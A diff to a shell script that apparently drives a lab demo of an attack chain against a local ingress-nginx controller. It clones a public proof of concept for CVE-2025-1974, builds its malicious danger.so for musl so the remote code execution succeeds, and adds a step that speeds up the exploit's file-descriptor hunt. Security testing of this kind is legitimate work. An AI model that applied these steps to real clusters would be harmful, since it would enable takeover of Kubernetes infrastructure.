@@ -17,7 +17,7 @@ HERE="$(cd "$(dirname "$0")" && pwd)"
 ROOT="$(cd "$HERE/../.." && pwd)"
 
 RAN_URL="${RAN_URL:-http://localhost:8080}"
-DEPLOY=1; BENIGN_ONLY=0; FROM=1; TO=20
+DEPLOY=1; BENIGN_ONLY=0; FROM=1; TO=22
 SIGN_OBJECT="${SIGN_OBJECT:-$ROOT/example/redis/distros/signed-bundles/sign-object}"
 VENDOR_KEY="${VENDOR_KEY:-$ROOT/example/redis/distros/signed-bundles/keys/vendor.pem}"
 NS=ingress-nginx; VER=controller-v1.11.0
@@ -67,7 +67,9 @@ if [ "$DEPLOY" = 1 ]; then
     ( cd "$HERE" && git clone -q https://github.com/Esonhugh/ingressNightmare-CVE-2025-1974-exps ein 2>/dev/null )
     say "rebuild danger.so for musl (the controller is Alpine; a glibc .so fails ENGINE_by_id with 'Exec format error' and the RCE silently no-ops)"
     docker run --rm -v "$HERE/ein/nginx-ingress":/work -w /work alpine:3.20 sh -c 'apk add --no-cache gcc musl-dev >/dev/null && gcc -fPIC -shared -o danger.so danger.c'
-    ( cd "$HERE/ein" && CGO_ENABLED=0 go build -o ing . ) 2>&1 | tail -2
+    say "harden the PoC fd-hunt (bound concurrency + recover + short per-attempt timeout so it lands in seconds instead of flooding the webhook past the exec cap)"
+    python3 "$HERE/hack/harden-ein.py" "$HERE/ein"
+    ( cd "$HERE/ein" && GOWORK=off CGO_ENABLED=0 go build -o ing . ) 2>&1 | tail -2
   fi
 fi
 
@@ -79,5 +81,6 @@ kubectl -n "$NS" rollout status deploy/ingress-nginx-controller --timeout=180s 2
 
 docker restart ran-ui >/dev/null 2>&1; sleep 15
 say "fire chain 3 (steps $FROM-$TO) via Ran"
-( cd "$HERE" && RAN_URL="$RAN_URL" python3 -u demo_chain3.py --from "$FROM" --to "$TO" --keep-going )
+RESET=""; [ "$FROM" = 1 ] && RESET="--reset"
+( cd "$HERE" && RAN_URL="$RAN_URL" python3 -u demo_chain3.py $RESET --from "$FROM" --to "$TO" --keep-going )
 say "done"
